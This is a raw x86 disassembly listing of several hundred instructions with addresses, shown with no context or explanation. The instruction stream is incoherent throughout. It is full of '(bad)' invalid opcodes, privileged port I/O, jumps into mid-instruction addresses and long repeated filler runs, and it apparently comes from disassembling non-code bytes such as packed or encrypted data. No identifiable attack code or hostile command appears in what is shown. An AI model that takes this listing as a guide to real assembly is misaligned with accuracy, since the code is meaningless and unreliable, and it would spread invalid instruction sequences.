  422cbc:	mov    WORD PTR gs:[edi-0x11f31b4e],cs
  422cc3:	in     al,dx
  422cc4:	or     al,BYTE PTR [eax-0x5795039]
  422cca:	cmp    cl,BYTE PTR [ebp-0x7fea2873]
  422cd0:	ja     0x422c58
  422cd2:	and    bh,0xaf
  422cd5:	mov    dl,0x84
  422cd7:	in     al,dx
  422cd8:	inc    ebx
  422cd9:	jo     0x422cbd
  422cdb:	out    dx,eax
  422cdc:	test   eax,0xee7be501
  422ce1:	les    edx,FWORD PTR [edi-0x80]
  422ce4:	(bad)  
  422ce5:	scas   eax,DWORD PTR es:[edi]
  422ce6:	in     eax,dx
  422ce7:	js     0x422cf5
  422ce9:	xchg   BYTE PTR [eax],ch
  422ceb:	cmp    cl,BYTE PTR [ebp-0x7fe22873]
  422cf1:	ja     0x422c79
  422cf3:	and    bh,0xaf
  422cf6:	mov    dl,0x84
  422cf8:	in     al,dx
  422cf9:	loop   0x422cea
  422cfb:	lahf   
  422cfc:	loop   0x422ced
  422cfe:	test   eax,0xee7b6601
  422d03:	cmp    cl,BYTE PTR [ebp+0x6c71c48d]
  422d09:	out    dx,al
  422d0a:	or     al,0x8d
  422d0c:	(bad)  
  422d0d:	in     al,dx
  422d0e:	out    0xaf,eax
  422d10:	loop   0x422d83
  422d12:	lahf   
  422d13:	cli    
  422d14:	lea    edi,[edx]
  422d16:	lea    ecx,[ebp+0x43f9f050]
  422d1c:	push   0x6d
  422d1e:	and    BYTE PTR [ecx-0x7a],0xbd
  422d22:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422d28:	push   ecx
  422d29:	in     al,0xc6
  422d2b:	cmp    dh,al
  422d2d:	stc    
  422d2e:	in     eax,dx
  422d2f:	out    0x76,eax
  422d31:	out    dx,al
  422d32:	or     ebp,ebp
  422d34:	bound  ecx,QWORD PTR [ebp+0x77ed8d8d]
  422d3a:	jbe    0x422cc8
  422d3c:	xor    al,0xf9
  422d3f:	in     eax,dx
  422d40:	retf   
  422d41:	out    dx,al
  422d42:	in     al,0xec
  422d44:	loop   0x422d32
  422d46:	lahf   
  422d47:	and    bh,0xfd
  422d4a:	mov    dl,0xba
  422d4c:	outs   dx,DWORD PTR ds:[esi]
  422d4d:	inc    ebx
  422d4e:	push   0x6d
  422d50:	loop   0x422dbf
  422d52:	test   eax,0xadc96601
  422d57:	in     al,dx
  422d58:	lea    ecx,[ebp+0x45866180]
  422d5e:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422d64:	push   ecx
  422d65:	in     al,0xc6
  422d67:	push   eax
  422d68:	lock xchg BYTE PTR [eax-0x10],dl
  422d6c:	sub    ebp,0xffffffcb
  422d6f:	out    dx,al
  422d70:	in     al,0xd3
  422d72:	add    BYTE PTR ds:0x3a83b7ed,0xb6
  422d79:	mov    ch,ch
  422d7b:	lock or DWORD PTR [ecx+esi*4],0xffffffed
  422d80:	retf   
  422d81:	mov    eax,ds:0x225e1fd3
  422d86:	or     al,0x8d
  422d88:	lea    eax,[ebx-0x4e]
  422d8b:	adc    BYTE PTR [ecx+0x72],0xb7
  422d8f:	sub    esp,0x77
  422d92:	xor    DWORD PTR [esi-0x288137c],0x50
  422d99:	ja     0x422d4a
  422d9b:	les    eax,FWORD PTR [edi-0x13]
  422d9e:	mov    dh,ch
  422da0:	xchg   BYTE PTR [eax],bh
  422da2:	lea    ecx,[ebp-0x493b4973]
  422da8:	mov    bh,0x83
  422daa:	pop    edi
  422dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dac:	test   ah,ah
  422dae:	outs   dx,DWORD PTR ds:[esi]
  422daf:	dec    ebp
  422db0:	ja     0x422d35
  422db2:	aas    
  422db3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422db4:	test   BYTE PTR [ecx+0x755e86d7],dh
  422dba:	outs   dx,DWORD PTR ds:[esi]
  422dbb:	lea    ecx,[ebp+0x50fd77ec]
  422dc1:	ja     0x422d72
  422dc3:	mov    dl,0xb7
  422dc5:	sub    esi,0xffffffe2
  422dc8:	out    dx,al
  422dc9:	test   eax,0x807b4d43
  422dce:	jl     0x422d50
  422dd0:	(bad)  
  422dd1:	scas   eax,DWORD PTR es:[edi]
  422dd2:	xchg   al,ah
  422dd4:	lea    ecx,[ebp-0x2ac5c173]
  422dda:	in     al,dx
  422ddb:	xor    bh,ah
  422ddd:	xor    DWORD PTR [esi-0x78284e44],0xffffffc4
  422de4:	lea    ecx,[ebp+0x77]
  422de7:	add    DWORD PTR [eax-0x4d120610],0xc
  422dee:	and    bh,0x8a
  422df1:	cmp    BYTE PTR [ebx+eax*2+0x77],0x35
  422df6:	pop    edi
  422df7:	ja     0x422d7c
  422df9:	fcmovnu st,st(2)
  422dfb:	or     BYTE PTR [ebx+0x43],0xd7
  422dff:	add    DWORD PTR [eax-0xab9c269],0x63
  422e06:	test   ebx,edx
  422e08:	in     al,dx
  422e09:	jg     0x422de2
  422e0b:	dec    ebx
  422e0c:	push   eax
  422e0d:	out    0x8a,eax
  422e0f:	or     eax,esp
  422e11:	xor    ah,BYTE PTR [ebx-0x19]
  422e14:	cmp    eax,0xccaaea09
  422e19:	dec    ebp
  422e1a:	dec    ebp
  422e1b:	xchg   dl,dl
  422e1d:	lea    ecx,[ebp+0x16a438d]
  422e23:	lds    esi,FWORD PTR ds:0x2d978065
  422e29:	adc    bh,0x8b
  422e2c:	inc    ebx
  422e2d:	xlat   BYTE PTR ds:[ebx]
  422e2e:	sbb    eax,0x9780d450
  422e33:	inc    ebp
  422e34:	and    bh,0x8a
  422e37:	inc    ebx
  422e38:	out    0x35,eax
  422e3a:	push   eax
  422e3b:	(bad)  
  422e3c:	jo     0x422de1
  422e3e:	test   eax,0x8d25fbab
  422e43:	test   eax,0x6d6a439d
  422e48:	les    eax,FWORD PTR [edx-0x7272f95e]
  422e4e:	lea    edi,[edx]
  422e50:	in     al,0x3a
  422e52:	je     0x422e06
  422e54:	mov    ah,0xef
  422e56:	cdq    
  422e57:	adc    bh,0x8b
  422e5a:	arpl   di,dx
  422e5c:	and    eax,0x7780f9d3
  422e61:	test   BYTE PTR [edx+0x5046ef84],dh
  422e67:	ja     0x422ded
  422e69:	push   eax
  422e6a:	xlat   BYTE PTR ds:[ebx]
  422e6b:	mov    ebp,DWORD PTR [ecx+0x76f08074]
  422e71:	or     eax,esp
  422e73:	push   0xffffffb2
  422e75:	mov    edx,0x8677ecee
  422e7a:	in     al,dx
  422e7b:	mov    dl,0xc4
  422e7d:	outs   dx,DWORD PTR ds:[esi]
  422e7e:	or     eax,esp
  422e80:	push   0xffffffec
  422e82:	ja     0x422efa
  422e84:	add    bh,0xfd
  422e87:	add    ebp,eax
  422e89:	ja     0x422e18
  422e8b:	inc    ebx
  422e8c:	push   0x1
  422e8e:	lds    esi,FWORD PTR [edi-0x73]
  422e91:	mov    ds:0x8d8d8d06,al
  422e96:	cmp    dl,bl
  422e98:	and    eax,0x5d353180
  422e9d:	mov    dl,0xb5
  422e9f:	xor    eax,0x3163ef2d
  422ea4:	xor    eax,0x8f26d3a5
  422ea9:	push   cs
  422eaa:	dec    ebp
  422eab:	jne    0x422ee2
  422ead:	pop    ebp
  422eae:	mov    dl,0xb4
  422eb0:	out    dx,eax
  422eb1:	adc    BYTE PTR [ebp+0x11802d35],dl
  422eb7:	or     DWORD PTR [edi+edx*4-0x73],ebx
  422ebb:	mov    dl,0xbe
  422ebd:	dec    DWORD PTR [ecx]
  422ebf:	and    bh,dh
  422ec1:	pop    edi
  422ec2:	xor    DWORD PTR ds:0x801bd32d,esi
  422ec8:	mov    al,ds:0x8def8d60
  422ecd:	lea    eax,[ebx-0x2]
  422ed0:	mov    dl,0xbe
  422ed2:	das    
  422ed3:	mov    ecx,0xec8df03a
  422ed8:	push   0x1
  422eda:	lds    esi,FWORD PTR ds:0x7b2746d
  422ee0:	das    
  422ee1:	aas    
  422ee2:	xor    DWORD PTR ds:0xb9a0432d,esi
  422ee8:	aas    
  422ee9:	xchg   edi,eax
  422eea:	(bad)  
  422eeb:	in     al,dx
  422eec:	push   0xffffffed
  422eee:	push   0x3a
  422ef0:	add    ebp,eax
  422ef2:	xor    eax,0x8099746d
  422ef7:	sub    al,BYTE PTR [esi+0x4d4d069c]
  422efd:	sbb    BYTE PTR [eax+eax*4+0x6ffc51],0x86
  422f05:	repnz push es
  422f07:	dec    ebp
  422f08:	dec    ebp
  422f09:	cdq    
  422f0a:	sub    BYTE PTR [edx],0xfc
  422f0d:	jns    0x422f3e
  422f0f:	stos   DWORD PTR es:[edi],eax
  422f10:	xchg   BYTE PTR [ebx-0x66b2b2fa],dh
  422f16:	cld    
  422f17:	jns    0x422f88
  422f19:	mov    ds:0x4d063986,eax
  422f1e:	dec    ebp
  422f1f:	cld    
  422f20:	jns    0x422f2e
  422f22:	cdq    
  422f23:	cmp    BYTE PTR [esi-0x42],0xc4
  422f27:	test   DWORD PTR [ebp+0x4d],ecx
  422f2a:	xchg   edi,eax
  422f2b:	add    BYTE PTR [edi+0x3a4587a2],0x8d
  422f32:	lea    edi,[edi+esi*2-0x75]
  422f36:	mul    BYTE PTR [edi+ebp*2]
  422f39:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  422f3d:	cmc    
  422f3e:	and    al,0x6f
  422f40:	cmp    BYTE PTR [eax+0x7750ef77],al
  422f46:	out    dx,eax
  422f47:	xor    BYTE PTR [edi-0x75],0x80
  422f4b:	xchg   edi,eax
  422f4c:	mov    edx,DWORD PTR [ebx+0xde29b99]
  422f52:	lahf   
  422f53:	push   ebx
  422f54:	mov    dh,0xb2
  422f56:	clc    
  422f57:	sub    DWORD PTR [edx+eiz*1+0x24],esp
  422f5b:	outs   dx,DWORD PTR ds:[esi]
  422f5c:	cmp    BYTE PTR [ebx+0x74],dl
  422f5f:	mov    dl,0x86
  422f61:	or     al,0xff
  422f63:	sti    
  422f64:	push   eax
  422f65:	ja     0x422fdd
  422f67:	xor    BYTE PTR [edi-0x75],0x80
  422f6b:	xchg   edi,eax
  422f6c:	mov    edx,DWORD PTR [ebx+0x74]
  422f6f:	mov    dl,0x86
  422f71:	or     al,0x53
  422f73:	mov    dh,0xb2
  422f75:	clc    
  422f76:	sub    edi,edi
  422f78:	sti    
  422f79:	push   eax
  422f7a:	ja     0x422f06
  422f7c:	xor    BYTE PTR [edi-0x75],0x80
  422f80:	xchg   edi,eax
  422f81:	mov    edx,DWORD PTR [ebx+0x74]
  422f84:	mov    dl,0x86
  422f86:	or     al,0x53
  422f88:	mov    dh,0xb2
  422f8a:	clc    
  422f8b:	sub    edi,edi
  422f8d:	sti    
  422f8e:	push   eax
  422f8f:	ja     0x422ff3
  422f91:	xor    BYTE PTR [edi-0x75],0x80
  422f95:	xchg   edi,eax
  422f96:	mov    edx,DWORD PTR [ebx+0x74]
  422f99:	mov    dl,0x86
  422f9b:	or     al,0x53
  422f9d:	mov    dh,0xb2
  422f9f:	clc    
  422fa0:	sub    edi,edi
  422fa2:	sti    
  422fa3:	push   eax
  422fa4:	ja     0x422f2c
  422fa6:	jl     0x42301f
  422fa8:	mul    BYTE PTR cs:[esi+ebp*8]
  422fac:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  422fb0:	mul    BYTE PTR [ebx+0x777c386f]
  422fb6:	es cli 
  422fb8:	and    al,0x6f
  422fba:	cmp    dl,ah
  422fbc:	cmp    eax,0x6277509d
  422fc1:	push   eax
  422fc2:	ja     0x423026
  422fc4:	loop   0x422f83
  422fc6:	popf   
  422fc7:	push   eax
  422fc8:	ja     0x42302c
  422fca:	push   eax
  422fcb:	ja     0x42302f
  422fcd:	jl     0x423046
  422fcf:	bound  ecx,QWORD PTR [edx]
  422fd1:	lea    ecx,[ebp+0x62777c8d]
  422fd7:	jns    0x422f66
  422fd9:	lea    ecx,[ebp-0x7f748880]
  422fdf:	xchg   edi,eax
  422fe0:	mov    edx,DWORD PTR [ebx+0x74]
  422fe3:	push   ebx
  422fe4:	mov    dh,0xb2
  422fe6:	xchg   BYTE PTR [edx+esi*4],cl
  422fe9:	clc    
  422fea:	sub    edi,edi
  422fec:	sti    
  422fed:	push   eax
  422fee:	ja     0x423052
  422ff0:	xor    BYTE PTR [edi-0x75],0x80
  422ff4:	xchg   edi,eax
  422ff5:	mov    edx,DWORD PTR [ebx+0x74]
  422ff8:	push   ebx
  422ff9:	mov    dh,0xb2
  422ffb:	xchg   BYTE PTR [edx+esi*4],cl
  422ffe:	clc    
  422fff:	sub    edi,edi
  423001:	sti    
  423002:	push   eax
  423003:	ja     0x423067
  423005:	jl     0x42307e
  423007:	jp     0x422fac
  423009:	or     al,0x8d
  42300b:	lea    edi,[edi+esi*2-0x7c]
  42300f:	pop    edi
  423010:	lea    ecx,[ebp-0x50888373]
  423016:	out    0x8d,eax
  423018:	lea    ecx,[ebp+0xdc86801]
  42301e:	dec    ebp
  42301f:	dec    ebp
  423020:	add    DWORD PTR [eax+0x7a],ebx
  423023:	or     eax,0xfe864d4d
  423028:	or     eax,0xf04d4d4d
  42302d:	scas   eax,DWORD PTR es:[edi]
  42302e:	xlat   BYTE PTR ds:[ebx]
  42302f:	pop    es
  423030:	dec    ebp
  423031:	lock test bh,dl
  423034:	add    al,0x4d
  423036:	lock jp 0x423010
  423039:	jb     0x4230b7
  42303b:	ja     0x422fc1
  42303d:	mov    eax,ds:0x808d8d6d
  423042:	ja     0x422fcf
  423044:	xor    al,0x8b
  423047:	push   ebx
  423048:	je     0x422ffc
  42304a:	xchg   BYTE PTR [edx+eiz*8],cl
  42304d:	or     eax,0xb25153a9
  423052:	mov    edx,0x50b2ff29
  423057:	ja     0x4230c3
  423059:	xor    BYTE PTR [edi-0x75],0x80
  42305d:	lock mov ebp,ebp
  423060:	mov    bh,0xc8
  423062:	lea    edx,[ebx+0x74]
  423065:	mov    dl,0x86
  423067:	or     al,0x53
  423069:	push   ecx
  42306a:	mov    dl,0xba
  42306c:	sub    edi,edi
  42306e:	mov    dl,0x50
  423070:	ja     0x4230ec
  423072:	mov    ch,0x4a
  423074:	sbb    eax,0x508d8d8d
  423079:	ja     0x423043
  42307b:	sub    BYTE PTR [ebp-0x7f],0x50
  42307f:	ja     0x423008
  423081:	sub    BYTE PTR [ebp+0x21],0x50
  423085:	ja     0x4230b9
  423087:	xor    BYTE PTR [edi-0x11],0x1
  42308b:	lock enter 0x1050,0x62
  423090:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  423096:	add    eax,esi
  423098:	xchg   DWORD PTR [eax+0x10],edx
  42309b:	push   esi
  42309c:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  4230a2:	dec    ebp
  4230a3:	xlat   BYTE PTR ds:[ebx]
  4230a4:	out    dx,eax
  4230a5:	add    eax,esi
  4230a7:	xor    dl,BYTE PTR [eax+0x10]
  4230aa:	pop    esi
  4230ab:	cmp    cl,BYTE PTR [ebp+0x3fba868d]
  4230b1:	lea    ecx,[ebp-0x7f740f80]
  4230b7:	xchg   edi,eax
  4230b8:	mov    edx,DWORD PTR [ebx+0x11]
  4230bb:	push   ebx
  4230bc:	jle    0x423070
  4230be:	mov    esi,0x29f8b20c
  4230c3:	(bad)  
  4230c4:	(bad)  
  4230c5:	arpl   bp,di
  4230c7:	or     DWORD PTR [edi],ecx
  4230c9:	(bad)  
  4230ca:	in     al,dx
  4230cb:	lea    ecx,[ebp-0x7f108880]
  4230d1:	int    0x36
  4230d3:	cmp    cl,BYTE PTR [ebp-0x7f107f73]
  4230d9:	ja     0x4230ca
  4230db:	or     ch,0x36
  4230de:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  4230e4:	xchg   edx,eax
  4230e5:	gs xor al,0xef
  4230e9:	adc    BYTE PTR [eax+0x32],0x3a
  4230ed:	lea    ecx,[ebp+0x4d151801]
  4230f3:	dec    ebp
  4230f4:	dec    ebp
  4230f5:	stos   BYTE PTR es:[edi],al
  4230f6:	adc    BYTE PTR [edi+0x26d180ef],0x3a
  4230fd:	lea    ecx,[ebp+0x5aec9080]
  423103:	adc    BYTE PTR [ebp-0x111d7273],cl
  423109:	dec    ebp
  42310a:	bound  eax,QWORD PTR [ecx-0x73]
  42310d:	lea    ecx,[ebp+0x25964daa]
  423113:	push   ebx
  423114:	push   0x7c
  423116:	dec    edi
  423117:	push   ebp
  423118:	dec    ebp
  423119:	dec    ebp
  42311a:	dec    ebp
  42311b:	outs   dx,BYTE PTR ds:[esi]
  42311c:	mov    ds:0x4f7c0a43,eax
  423121:	pop    ebp
  423122:	dec    ebp
  423123:	dec    ebp
  423124:	dec    ebp
  423125:	jg     0x4230d5
  423127:	push   ebp
  423128:	fwait
  423129:	jl     0x42317a
  42312b:	gs dec ebp
  42312d:	dec    ebp
  42312e:	dec    ebp
  42312f:	stos   DWORD PTR es:[edi],eax
  423130:	lock scas al,BYTE PTR es:[edi]
  423132:	aas    
  423133:	cld    
  423134:	dec    edi
  423135:	ins    DWORD PTR es:[edi],dx
  423136:	dec    ebp
  423137:	dec    ebp
  423138:	dec    ebp
  423139:	xchg   BYTE PTR [ecx],al
  42313b:	push   0x4d4d4d92
  423140:	inc    esp
  423141:	mov    ecx,0x6a53f544
  423146:	jl     0x423197
  423148:	sub    eax,0x6e4d4d4d
  42314d:	mov    ds:0x4f7c0a43,eax
  423152:	xor    eax,0x7f4d4d4d
  423157:	scas   al,BYTE PTR es:[edi]
  423158:	push   ebp
  423159:	fwait
  42315a:	jl     0x4231ab
  42315c:	cmp    eax,0xab4d4d4d
  423161:	lock scas al,BYTE PTR es:[edi]
  423163:	imul   edi,esp,0x4f
  423166:	inc    ebp
  423167:	dec    ebp
  423168:	dec    ebp
  423169:	dec    ebp
  42316a:	xchg   BYTE PTR [ecx],al
  42316c:	push   0x4d4d4d47
  423171:	inc    esp
  423172:	mov    ecx,0x7780f544
  423177:	out    dx,eax
  423178:	or     ch,0x32
  42317b:	cmp    cl,BYTE PTR [ebp-0x10187f73]
  423181:	in     eax,dx
  423182:	push   0x71
  423184:	push   eax
  423185:	ja     0x4231bd
  423187:	xor    BYTE PTR [edi-0x11],0x80
  42318b:	int    0xfd
  42318d:	cmp    cl,BYTE PTR [ebp-0x32888373]
  423193:	xchg   ebp,eax
  423194:	mov    ds:0x777caea5,eax
  423199:	lldt   WORD PTR [edi+0x7cb9969d]
  4231a0:	ja     0x4231b2
  4231a2:	aas    
  4231a3:	xchg   BYTE PTR [edi+ecx*2-0x3b],bh
  4231a7:	dec    ebp
  4231a8:	dec    ebp
  4231a9:	dec    ebp
  4231aa:	outs   dx,BYTE PTR ds:[esi]
  4231ab:	mov    ds:0x4f7c0a43,eax
  4231b0:	push   edx
  4231b1:	dec    ebp
  4231b2:	dec    ebp
  4231b3:	dec    ebp
  4231b4:	jg     0x423164
  4231b6:	aas    
  4231b7:	xchg   ebp,eax
  4231b8:	jl     0x423209
  4231ba:	aad    0x4d
  4231bc:	dec    ebp
  4231bd:	dec    ebp
  4231be:	popf   
  4231bf:	or     bh,BYTE PTR [edi+0x59]
  4231c2:	jl     0x423213
  4231c4:	fisttp QWORD PTR [ebp+0x4d]
  4231c7:	dec    ebp
  4231c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231c9:	xchg   edi,eax
  4231ca:	lock scas al,BYTE PTR es:[edi]
  4231cc:	jl     0x42321d
  4231ce:	in     eax,0x4d
  4231d0:	dec    ebp
  4231d1:	dec    ebp
  4231d2:	xchg   esi,eax
  4231d3:	add    BYTE PTR [edi],bh
  4231d5:	xchg   BYTE PTR [edi+ecx*2-0x63],bh
  4231d9:	dec    ebp
  4231da:	dec    ebp
  4231db:	dec    ebp
  4231dc:	outs   dx,BYTE PTR ds:[esi]
  4231dd:	mov    ds:0x4f7c0a43,eax
  4231e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231e3:	dec    ebp
  4231e4:	dec    ebp
  4231e5:	dec    ebp
  4231e6:	jg     0x423196
  4231e8:	aas    
  4231e9:	xchg   ebp,eax
  4231ea:	jl     0x42323b
  4231ec:	lods   eax,DWORD PTR ds:[esi]
  4231ed:	dec    ebp
  4231ee:	dec    ebp
  4231ef:	dec    ebp
  4231f0:	popf   
  4231f1:	or     bh,BYTE PTR [edi+0x59]
  4231f4:	jl     0x423245
  4231f6:	mov    ch,0x4d
  4231f8:	dec    ebp
  4231f9:	dec    ebp
  4231fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231fb:	xchg   edi,eax
  4231fc:	lock scas al,BYTE PTR es:[edi]
  4231fe:	jl     0x42324f
  423200:	mov    ebp,0x964d4d4d
  423205:	add    BYTE PTR [ebx-0x7a],ch
  423208:	xchg   BYTE PTR [edx+0x3d],ah
  42320b:	lea    ecx,[ebp+0x3677800a]
  423211:	dec    ebp
  423212:	jno    0x423194
  423214:	ja     0x4231a1
  423216:	xor    al,0x8b
  423219:	push   ebx
  42321a:	je     0x42326f
  42321c:	push   ecx
  42321d:	mov    dl,0xba
  42321f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423225:	xor    al,0x84
  423228:	arpl   WORD PTR [edx+0x3aca0f09],si
  42322e:	lea    ecx,[ebp-0x7f068880]
  423234:	lock stc 
  423236:	push   ebx
  423237:	je     0x42328c
  423239:	push   ecx
  42323a:	mov    dl,0xba
  42323c:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423242:	xor    al,0x84
  423245:	inc    ebx
  423246:	std    
  423247:	xor    BYTE PTR [edi+0x6a],0x63
  42324b:	mov    dl,0x9
  42324d:	into   
  42324e:	xchg   esp,eax
  42324f:	cmp    cl,BYTE PTR [ebp+0x3e777c8d]
  423255:	lea    ecx,[ebp+0x77808d8d]
  42325b:	out    dx,eax
  42325c:	and    BYTE PTR [edx+0x32],0x3a
  423260:	lea    ecx,[ebp-0x7f101880]
  423266:	ja     0x423257
  423268:	or     ch,0x76
  42326b:	cmp    cl,BYTE PTR [ebp+0x3dda868d]
  423271:	lea    ecx,[ebp+0x71994d0a]
  423277:	xor    al,0xef
  42327a:	adc    BYTE PTR [eax+0x46],0x3a
  42327e:	lea    ecx,[ebp+0x77803a50]
  423284:	out    dx,eax
  423285:	sbb    BYTE PTR [esi+0x32],0x3a
  423289:	lea    ecx,[ebp+0x53efd780]
  42328f:	push   0x1
  423291:	sbb    BYTE PTR [ebp-0x79b2b2b3],bl
  423297:	fwait
  423298:	cmp    eax,0x800a8d8d
  42329d:	ja     0x42328e
  42329f:	or     ch,0x46
  4232a2:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4232a8:	fwait
  4232a9:	out    dx,eax
  4232aa:	push   eax
  4232ab:	ja     0x4232c3
  4232ad:	xor    BYTE PTR [edi-0x11],0x80
  4232b1:	pop    esi
  4232b2:	xor    bh,BYTE PTR [edx]
  4232b4:	lea    ecx,[ebp+0x53efd780]
  4232ba:	push   0x1
  4232bc:	sbb    ch,al
  4232be:	dec    ebp
  4232bf:	dec    ebp
  4232c0:	dec    ebp
  4232c1:	xchg   BYTE PTR [ebp+0x3d],al
  4232c4:	lea    ecx,[ebp-0x10887ff6]
  4232ca:	or     ch,0x46
  4232cd:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4232d3:	fwait
  4232d4:	out    dx,eax
  4232d5:	xor    BYTE PTR [edi-0x11],0x80
  4232d9:	pop    esi
  4232da:	xor    bh,BYTE PTR [edx]
  4232dc:	lea    ecx,[ebp+0x53efd780]
  4232e2:	push   0x1
  4232e4:	sbb    BYTE PTR [ebp+0x4d],dl
  4232e7:	dec    ebp
  4232e8:	dec    ebp
  4232e9:	xchg   dh,ch
  4232eb:	cmp    eax,0x800a8d8d
  4232f0:	ja     0x4232e1
  4232f2:	or     ch,0x46
  4232f5:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4232fb:	fwait
  4232fc:	out    dx,eax
  4232fd:	in     eax,dx
  4232fe:	mov    bh,0x5e
  423300:	lea    edx,[eax+0x77]
  423303:	xor    BYTE PTR ss:[edi+0x5e],0xe2
  423308:	pop    ds
  423309:	push   ebx
  42330a:	jb     0x4232ab
  42330c:	dec    ebx
  42330d:	add    eax,0x992fbcd
  423312:	loopne 0x42330f
  423314:	or     cl,BYTE PTR [ebp-0x69]
  423317:	ss dec edi
  423319:	push   0xffffffd7
  42331b:	arpl   WORD PTR [eax-0x7b12a189],ax
  423321:	mov    ebp,gs
  423323:	push   0x6e
  423325:	or     cl,BYTE PTR [ebp-0x69]
  423328:	push   ss
  423329:	dec    edi
  42332a:	push   0xffffffd5
  42332c:	rol    BYTE PTR [eax+0x5e80ef77],cl
  423332:	xor    bh,BYTE PTR [edx]
  423334:	lea    ecx,[ebp+0x53efd780]
  42333a:	push   0x1
  42333c:	xchg   edi,eax
  42333d:	int    0x86
  42333f:	and    bh,BYTE PTR [ebx]
  423341:	lea    ecx,[ebp-0x10887ff6]
  423347:	or     ch,0x3e
  42334a:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  423350:	fwait
  423351:	out    dx,eax
  423352:	push   eax
  423353:	ja     0x423304
  423355:	(bad)  
  423356:	out    dx,al
  423357:	in     eax,dx
  423358:	mov    bh,0xaf
  42335a:	lea    ecx,[ebp+0x77]
  42335d:	pop    esi
  42335e:	in     eax,dx
  42335f:	out    0x5e,eax
  423361:	sub    eax,0x77802ee4
  423366:	stc    
  423367:	xor    al,0xf9
  42336a:	adc    bh,0xef
  42336d:	loop   0x42337c
  42336f:	stos   DWORD PTR es:[edi],eax
  423370:	push   ebx
  423371:	je     0x4233c6
  423373:	sub    dh,BYTE PTR [edx-0x454df37a]
  423379:	sub    edi,edi
  42337b:	mov    dl,0x1
  42337d:	sbb    al,cl
  42337f:	or     eax,0xc3864d4d
  423384:	cmp    ecx,DWORD PTR [ebp+0x77800a8d]
  42338a:	mov    eax,DWORD PTR [eax-0x287f7410]
  423390:	out    dx,eax
  423391:	push   ebx
  423392:	je     0x4233e7
  423394:	sub    dh,BYTE PTR [edx-0x454df37a]
  42339a:	sub    edi,edi
  42339c:	mov    dl,0x1
  42339e:	sbb    BYTE PTR [edx+0xd],bh
  4233a1:	dec    ebp
  4233a2:	dec    ebp
  4233a3:	xchg   dl,bl
  4233a5:	cmp    ecx,DWORD PTR [ebp-0x68b2f573]
  4233ab:	scas   eax,DWORD PTR es:[edi]
  4233ac:	xor    al,0x8b
  4233af:	adc    BYTE PTR [edi+0x5311538b],0x9c
  4233b6:	mov    dl,0xbe
  4233b8:	or     al,0xb2
  4233ba:	clc    
  4233bb:	sub    edi,edi
  4233bd:	(bad)  
  4233be:	arpl   bp,di
  4233c0:	xlat   BYTE PTR ds:[ebx]
  4233c1:	mov    WORD PTR [edi+esi*2+0x3e],?
  4233c5:	cmp    cl,BYTE PTR [ebp+0x77808d8d]
  4233cb:	stc    
  4233cc:	xor    al,0xf9
  4233cf:	push   ebx
  4233d0:	je     0x423384
  4233d2:	xchg   BYTE PTR [ebx+edx*2],cl
  4233d5:	sub    dh,BYTE PTR [edx-0x4d00d646]
  4233db:	in     al,dx
  4233dc:	ja     0x423448
  4233de:	push   eax
  4233df:	ja     0x42344b
  4233e1:	xor    BYTE PTR [edi+0x3e],0x4f
  4233e5:	push   0xffffffd5
  4233e7:	sbb    eax,0x80f97780
  4233ec:	lock stc 
  4233ee:	push   ebx
  4233ef:	je     0x423444
  4233f1:	sub    dh,BYTE PTR [edx-0x454df37a]
  4233f7:	sub    edi,edi
  4233f9:	mov    dl,0xec
  4233fb:	ja     0x423477
  4233fd:	push   eax
  4233fe:	ja     0x42347a
  423400:	xor    BYTE PTR [edi-0x7],0x80
  423404:	lock stc 
  423406:	push   ebx
  423407:	je     0x42345c
  423409:	sub    dh,BYTE PTR [edx-0x794dd646]
  42340f:	or     al,0xff
  423411:	mov    dl,0x80
  423413:	lock test BYTE PTR [ebx-0x3],al
  423417:	xor    BYTE PTR [edi+0x6a],0x63
  42341b:	mov    dl,0x9
  42341d:	dec    esp
  42341e:	or     DWORD PTR ds:0xde24d4d,0x7a7780a9
  423428:	xor    al,0x6a
  42342b:	arpl   bp,di
  42342d:	xlat   BYTE PTR ds:[ebx]
  42342e:	push   cs
  42342f:	dec    ebp
  423430:	xlat   BYTE PTR ds:[ebx]
  423431:	out    dx,eax
  423432:	add    DWORD PTR [edi-0x76],esi
  423435:	or     al,BYTE PTR [esi-0x7272809a]
  42343b:	push   eax
  42343c:	ja     0x4234b4
  42343e:	les    ebx,FWORD PTR [ebx]
  423440:	xor    BYTE PTR [edi+0x76],0x80
  423444:	lock stc 
  423446:	adc    BYTE PTR [edi+0x531153f9],0x7e
  42344d:	mov    dl,0xbe
  42344f:	or     al,0xb2
  423451:	clc    
  423452:	sub    edi,edi
  423454:	(bad)  
  423455:	outs   dx,BYTE PTR ds:[esi]
  423456:	out    dx,eax
  423457:	xor    BYTE PTR [edi-0x75],0x80
  42345b:	lock mov edx,DWORD PTR [ebx+0x74]
  42345f:	push   ebx
  423460:	push   ecx
  423461:	mov    dl,0xba
  423463:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423469:	xor    al,0x76
  42346c:	arpl   WORD PTR [edx-0x33f0f7],si
  423472:	lea    ecx,[ebp-0x7f748880]
  423478:	lock mov edx,DWORD PTR [ebx+0x74]
  42347c:	push   ebx
  42347d:	push   ecx
  42347e:	mov    dl,0xba
  423480:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423486:	xor    al,0x8a
  423489:	arpl   WORD PTR [edx-0x7bf0f7],si
  42348f:	lea    ecx,[ebp-0x7f748880]
  423495:	lock mov edx,DWORD PTR [ebx+0x74]
  423499:	push   ebx
  42349a:	push   ecx
  42349b:	mov    dl,0x86
  42349d:	or     al,0xb2
  42349f:	mov    edx,0xc4b2ff29
